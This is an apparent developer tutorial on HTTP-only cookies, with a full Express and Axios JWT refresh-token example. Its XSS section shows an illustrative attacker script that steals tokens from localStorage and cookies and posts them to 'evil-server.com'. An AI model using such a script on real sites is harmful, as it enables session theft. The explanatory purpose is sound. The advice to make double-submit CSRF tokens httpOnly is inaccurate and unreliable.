# HTTP-Only Cookies

## Table of Contents

1. [What Are HTTP-Only Cookies](#what-are-http-only-cookies)
2. [Security Benefit: XSS Mitigation](#security-benefit-xss-mitigation)
3. [Complete Auth Example with JWT Refresh Tokens](#complete-auth-example-with-jwt-refresh-tokens)
4. [Frontend Integration with Axios](#frontend-integration-with-axios)
5. [Storage Location](#storage-location)
6. [Expiration Handling](#expiration-handling)
7. [When to Use httpOnly vs Regular Cookies](#when-to-use-httponly-vs-regular-cookies)

---

## What Are HTTP-Only Cookies

HTTP-only cookies are cookies that include the `HttpOnly` flag. This flag instructs the browser to **block all JavaScript access** to the cookie. The cookie still exists in the browser, still gets sent with every request, but it is completely invisible to client-side scripts.

```javascript
// Setting an HTTP-only cookie
res.cookie("refreshToken", tokenValue, {
  httpOnly: true, // This is the key flag
});
```

### What "Server-Only" Means

- The cookie **can only be set** by the server (via `Set-Cookie` header).
- The cookie **can only be read** by the server (from the `Cookie` header on incoming requests).
- The cookie **cannot be accessed** via `document.cookie` in the browser.
- The cookie **cannot be modified or deleted** by client-side JavaScript.

```javascript
// In the browser console
console.log(document.cookie);
// Output: "theme=dark; language=en"
// Notice: the httpOnly cookie is NOT listed here, even though it exists
```

The cookie is still visible in the browser's DevTools (Application > Cookies tab) for debugging purposes, but no JavaScript running on the page can interact with it programmatically.

---

## Security Benefit: XSS Mitigation

### The XSS Attack Scenario

Cross-Site Scripting (XSS) occurs when an attacker injects malicious JavaScript into your website. If auth tokens are stored in places accessible to JavaScript, the attacker can steal them:

```javascript
// Attacker's injected script -- steals tokens from accessible locations
const stolenToken = localStorage.getItem("authToken");
// OR
const stolenCookie = document.cookie; // Gets all non-httpOnly cookies

// Send stolen token to attacker's server
fetch("https://evil-server.com/steal", {
  method: "POST",
  body: JSON.stringify({ token: stolenToken }),
});
```

### How httpOnly Protects Against This

With httpOnly cookies, even if the attacker successfully injects a script, they **cannot read the cookie**:

```javascript
// Attacker's injected script
const cookies = document.cookie;
// Result: "theme=dark" -- the auth token is NOT here

// The attacker CANNOT access the httpOnly cookie
// The token is safe from JavaScript-based theft
```

### What httpOnly Does NOT Protect Against

It is important to understand the limits:

- **CSRF attacks:** The cookie is still sent automatically with requests, so CSRF is still possible (use `sameSite` and CSRF tokens to mitigate).
- **Network interception:** Without `secure: true`, cookies can be intercepted over HTTP (always use HTTPS).
- **Server-side vulnerabilities:** If the server itself is compromised, httpOnly provides no protection.

---

## Complete Auth Example with JWT Refresh Tokens

This example implements a dual-token authentication system:

- **Access Token:** Short-lived JWT sent in the response body, stored in memory on the frontend.
- **Refresh Token:** Long-lived JWT stored in an httpOnly cookie, used to get new access tokens.

### Project Structure

```
project/
  src/
    app.js
    controllers/
      authController.js
    middleware/
      authMiddleware.js
    routes/
      authRoutes.js
    models/
      userModel.js
```

### User Model

```javascript
// src/models/userModel.js
import mongoose from "mongoose";
import bcrypt from "bcrypt";

const userSchema = new mongoose.Schema({
  email: {
    type: String,
    required: true,
    unique: true,
    lowercase: true,
  },
  password: {
    type: String,
    required: true,
    minlength: 8,
  },
  refreshTokenVersion: {
    type: Number,
    default: 0,
  },
});

// Hash password before saving
userSchema.pre("save", async function (next) {
  if (!this.isModified("password")) return next();
  this.password = await bcrypt.hash(this.password, 12);
  next();
});

// Compare password method
userSchema.methods.comparePassword = async function (candidatePassword) {
  return bcrypt.compare(candidatePassword, this.password);
};

const User = mongoose.model("User", userSchema);
export default User;
```

### Auth Controller

```javascript
// src/controllers/authController.js
import jwt from "jsonwebtoken";
import User from "../models/userModel.js";

const ACCESS_TOKEN_SECRET = process.env.ACCESS_TOKEN_SECRET;
const REFRESH_TOKEN_SECRET = process.env.REFRESH_TOKEN_SECRET;
const ACCESS_TOKEN_EXPIRY = "15m";
const REFRESH_TOKEN_EXPIRY = "7d";

// Helper: Generate access token
const generateAccessToken = (userId) => {
  return jwt.sign({ userId }, ACCESS_TOKEN_SECRET, {
    expiresIn: ACCESS_TOKEN_EXPIRY,
  });
};

// Helper: Generate refresh token
const generateRefreshToken = (userId, tokenVersion) => {
  return jwt.sign({ userId, tokenVersion }, REFRESH_TOKEN_SECRET, {
    expiresIn: REFRESH_TOKEN_EXPIRY,
  });
};

// Helper: Set refresh token as httpOnly cookie
const setRefreshTokenCookie = (res, token) => {
  res.cookie("refreshToken", token, {
    httpOnly: true,       // Not accessible via document.cookie
    secure: process.env.NODE_ENV === "production",
    sameSite: "strict",   // Prevent CSRF
    path: "/api/auth",    // Only sent to auth routes (limits exposure)
    maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days in milliseconds
  });
};

// ============================================================
// LOGIN ENDPOINT
// Sets both access token (in body) and refresh token (in cookie)
// ============================================================
export const login = async (req, res) => {
  try {
    const { email, password } = req.body;

    // Find user and verify password
    const user = await User.findOne({ email });
    if (!user || !(await user.comparePassword(password))) {
      return res.status(401).json({ message: "Invalid email or password" });
    }

    // Generate tokens
    const accessToken = generateAccessToken(user._id);
    const refreshToken = generateRefreshToken(
      user._id,
      user.refreshTokenVersion
    );

    // Set refresh token in httpOnly cookie
    setRefreshTokenCookie(res, refreshToken);

    // Send access token in response body
    // The frontend stores this in memory (a variable), NOT in localStorage
    res.json({
      accessToken,
      user: {
        id: user._id,
        email: user.email,
      },
    });
  } catch (error) {
    res.status(500).json({ message: "Login failed", error: error.message });
  }
};

// ============================================================
// REFRESH ENDPOINT
// Reads refresh token from cookie, verifies it, issues new access token
// ============================================================
export const refresh = async (req, res) => {
  try {
    // Read the refresh token from the httpOnly cookie
    const { refreshToken } = req.cookies;

    if (!refreshToken) {
      return res.status(401).json({ message: "No refresh token provided" });
    }

    // Verify the refresh token
    let decoded;
    try {
      decoded = jwt.verify(refreshToken, REFRESH_TOKEN_SECRET);
    } catch (err) {
      return res.status(401).json({ message: "Invalid or expired refresh token" });
    }

    // Find the user
    const user = await User.findById(decoded.userId);
    if (!user) {
      return res.status(401).json({ message: "User not found" });
    }

    // Check token version (allows server-side invalidation)
    // If the user has changed their password or logged out from all devices,
    // refreshTokenVersion is incremented, invalidating all old refresh tokens
    if (decoded.tokenVersion !== user.refreshTokenVersion) {
      return res.status(401).json({ message: "Token has been revoked" });
    }

    // Generate a new access token
    const newAccessToken = generateAccessToken(user._id);

    // Optionally: rotate the refresh token (issue a new one)
    const newRefreshToken = generateRefreshToken(
      user._id,
      user.refreshTokenVersion
    );
    setRefreshTokenCookie(res, newRefreshToken);

    res.json({ accessToken: newAccessToken });
  } catch (error) {
    res.status(500).json({ message: "Token refresh failed", error: error.message });
  }
};

// ============================================================
// LOGOUT ENDPOINT
// Clears the httpOnly cookie and increments token version
// ============================================================
export const logout = async (req, res) => {
  try {
    // Clear the refresh token cookie
    // IMPORTANT: path must match the path used when setting the cookie
    res.clearCookie("refreshToken", {
      httpOnly: true,
      secure: process.env.NODE_ENV === "production",
      sameSite: "strict",
      path: "/api/auth",
    });

    // Increment token version to invalidate all existing refresh tokens
    // This is useful for "logout from all devices"
    if (req.userId) {
      await User.findByIdAndUpdate(req.userId, {
        $inc: { refreshTokenVersion: 1 },
      });
    }

    res.json({ message: "Logged out successfully" });
  } catch (error) {
    res.status(500).json({ message: "Logout failed", error: error.message });
  }
};
```

### Auth Middleware

```javascript
// src/middleware/authMiddleware.js
import jwt from "jsonwebtoken";

const ACCESS_TOKEN_SECRET = process.env.ACCESS_TOKEN_SECRET;

export const authenticate = (req, res, next) => {
  // The access token comes from the Authorization header, NOT from a cookie
  const authHeader = req.headers.authorization;

  if (!authHeader || !authHeader.startsWith("Bearer ")) {
    return res.status(401).json({ message: "Access token required" });
  }

  const token = authHeader.split(" ")[1];

  try {
    const decoded = jwt.verify(token, ACCESS_TOKEN_SECRET);
    req.userId = decoded.userId;
    next();
  } catch (error) {
    return res.status(401).json({ message: "Invalid or expired access token" });
  }
};
```

### Routes

```javascript
// src/routes/authRoutes.js
import { Router } from "express";
import { login, refresh, logout } from "../controllers/authController.js";
import { authenticate } from "../middleware/authMiddleware.js";

const router = Router();

router.post("/login", login);
router.post("/refresh", refresh);         // Cookie is sent automatically
router.post("/logout", authenticate, logout);

export default router;
```

### App Setup

```javascript
// src/app.js
import express from "express";
import cookieParser from "cookie-parser";
import cors from "cors";
import authRoutes from "./routes/authRoutes.js";

const app = express();

// Middleware
app.use(express.json());
app.use(cookieParser());
app.use(
  cors({
    origin: "http://localhost:5173",  // Your frontend URL
    credentials: true,                // Allow cookies to be sent cross-origin
  })
);

// Routes
app.use("/api/auth", authRoutes);

export default app;
```

---

## Frontend Integration with Axios

The frontend stores the **access token in memory** (a variable) and relies on the **httpOnly cookie** for the refresh token. The browser handles the cookie automatically.

### Axios Setup with Interceptors

```javascript
// src/api/axiosInstance.js
import axios from "axios";

const api = axios.create({
  baseURL: "http://localhost:3000/api",
  withCredentials: true, // CRITICAL: tells axios to send cookies with every request
});

// Store the access token in memory (NOT in localStorage)
let accessToken = null;

// Function to update the access token (called after login or refresh)
export const setAccessToken = (token) => {
  accessToken = token;
};

export const getAccessToken = () => accessToken;

// REQUEST INTERCEPTOR
// Attaches the access token to every outgoing request
api.interceptors.request.use(
  (config) => {
    if (accessToken) {
      config.headers.Authorization = `Bearer ${accessToken}`;
    }
    return config;
  },
  (error) => Promise.reject(error)
);

// RESPONSE INTERCEPTOR
// If a request fails with 401, try to refresh the token and retry
api.interceptors.response.use(
  (response) => response,
  async (error) => {
    const originalRequest = error.config;

    // If access token expired and we have not already retried
    if (error.response?.status === 401 && !originalRequest._retry) {
      originalRequest._retry = true;

      try {
        // Call refresh endpoint
        // The browser automatically sends the httpOnly refresh token cookie
        const { data } = await axios.post(
          "http://localhost:3000/api/auth/refresh",
          {},
          { withCredentials: true }
        );

        // Store the new access token in memory
        accessToken = data.accessToken;

        // Retry the original request with the new token
        originalRequest.headers.Authorization = `Bearer ${accessToken}`;
        return api(originalRequest);
      } catch (refreshError) {
        // Refresh token is also invalid -- user must log in again
        accessToken = null;
        window.location.href = "/login";
        return Promise.reject(refreshError);
      }
    }

    return Promise.reject(error);
  }
);

export default api;
```

### Login Component

```javascript
// src/pages/Login.jsx
import { useState } from "react";
import api, { setAccessToken } from "../api/axiosInstance.js";

const Login = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  const handleLogin = async (e) => {
    e.preventDefault();

    try {
      const { data } = await api.post("/auth/login", { email, password });

      // Store access token in memory
      setAccessToken(data.accessToken);

      // The refresh token was automatically stored as an httpOnly cookie
      // by the browser -- no code needed here for that

      console.log("Logged in as:", data.user.email);
    } catch (error) {
      console.error("Login failed:", error.response?.data?.message);
    }
  };

  return (
    <form onSubmit={handleLogin}>
      <input
        type="email"
        value={email}
        onChange={(e) => setEmail(e.target.value)}
        placeholder="Email"
      />
      <input
        type="password"
        value={password}
        onChange={(e) => setPassword(e.target.value)}
        placeholder="Password"
      />
      <button type="submit">Login</button>
    </form>
  );
};

export default Login;
```

### Logout

```javascript
// Logout handler
import api, { setAccessToken } from "../api/axiosInstance.js";

const handleLogout = async () => {
  try {
    await api.post("/auth/logout");
    // The server clears the httpOnly cookie via res.clearCookie()

    // Clear the in-memory access token
    setAccessToken(null);

    // Redirect to login
    window.location.href = "/login";
  } catch (error) {
    console.error("Logout failed:", error);
  }
};
```

---

## Storage Location

Understanding where each token lives is critical to this pattern:

| Token         | Storage Location        | Who Can Access It         | Sent How                        |
| ------------- | ----------------------- | ------------------------- | ------------------------------- |
| Access Token  | JavaScript variable (memory) | Frontend JavaScript    | Manually via `Authorization` header |
| Refresh Token | httpOnly cookie         | Only the browser/server   | Automatically by the browser    |

### Why This Split?

- **Access token in memory:** Short-lived (15 minutes). If the page refreshes, it is lost. This is acceptable because the refresh token can generate a new one. Storing it in memory means XSS cannot steal a long-lived token.
- **Refresh token in httpOnly cookie:** Long-lived (7 days). Protected from JavaScript access. The browser manages it automatically. Even if XSS occurs, the attacker cannot extract it.

### What Happens on Page Refresh?

When the user refreshes the page, the in-memory access token is lost. The application should:

1. On app initialization, call the `/api/auth/refresh` endpoint.
2. The browser automatically sends the httpOnly cookie with the request.
3. If the refresh token is valid, the server returns a new access token.
4. The app stores the new access token in memory and continues.

```javascript
// src/App.jsx
import { useEffect, useState } from "react";
import api, { setAccessToken } from "./api/axiosInstance.js";

const App = () => {
  const [loading, setLoading] = useState(true);
  const [isAuthenticated, setIsAuthenticated] = useState(false);

  useEffect(() => {
    const initAuth = async () => {
      try {
        // Attempt to refresh the token on app load
        const { data } = await api.post("/auth/refresh");
        setAccessToken(data.accessToken);
        setIsAuthenticated(true);
      } catch {
        // No valid refresh token -- user is not logged in
        setIsAuthenticated(false);
      } finally {
        setLoading(false);
      }
    };

    initAuth();
  }, []);

  if (loading) return <div>Loading...</div>;

  return isAuthenticated ? <Dashboard /> : <Login />;
};

export default App;
```

---

## Expiration Handling

### Access Token Expiration (15 minutes)

The access token expires frequently. When it does:

1. The API request returns `401 Unauthorized`.
2. The Axios response interceptor catches the 401.
3. It calls `/api/auth/refresh` to get a new access token.
4. The original request is retried with the new token.
5. This all happens transparently to the user.

### Refresh Token Expiration (7 days)

When the refresh token expires:

1. The `/api/auth/refresh` call fails.
2. The response interceptor cannot recover.
3. The user is redirected to the login page.
4. They must authenticate again with their credentials.

### Token Refresh Timeline

```
Time 0:00   - User logs in
              Access Token: valid (expires at 0:15)
              Refresh Token Cookie: valid (expires at 7 days)

Time 0:15   - Access token expires
              API call returns 401
              Interceptor calls /refresh
              New access token issued (expires at 0:30)
              (Refresh token cookie is automatically sent and still valid)

Time 0:30   - Access token expires again
              Same refresh flow repeats...

Day 7       - Refresh token cookie expires
              Browser stops sending it
              /refresh call fails
              User redirected to login
```

---

## When to Use httpOnly vs Regular Cookies

### Use httpOnly Cookies For:

- **Authentication tokens** (refresh tokens, session IDs)
- **CSRF tokens** (when using the double-submit pattern)
- **Any sensitive data** that the frontend does not need to read

### Use Regular Cookies For:

- **UI preferences** (theme, sidebar state, language) that JavaScript needs to read on page load
- **Analytics identifiers** that client-side scripts need to access
- **Feature flags** that the frontend reads to toggle UI elements

### Decision Guide

```
Does the frontend JavaScript need to READ the cookie value?
  |
  +-- YES --> Use a regular cookie (httpOnly: false)
  |            Examples: theme, language, feature flags
  |
  +-- NO  --> Use an httpOnly cookie (httpOnly: true)
               Examples: auth tokens, session IDs, refresh tokens
```

### Summary Table

| Data Type           | httpOnly | secure | sameSite     | maxAge             |
| ------------------- | -------- | ------ | ------------ | ------------------ |
| Refresh Token       | `true`   | `true` | `"strict"`   | 7 days             |
| Session ID          | `true`   | `true` | `"strict"`   | Session or 24h     |
| CSRF Token          | `true`   | `true` | `"strict"`   | Match session      |
| Theme Preference    | `false`  | `false`| `"lax"`      | 1 year             |
| Language Preference | `false`  | `false`| `"lax"`      | 1 year             |
| Tracking ID         | `false`  | `true` | `"none"`     | 1 year             |
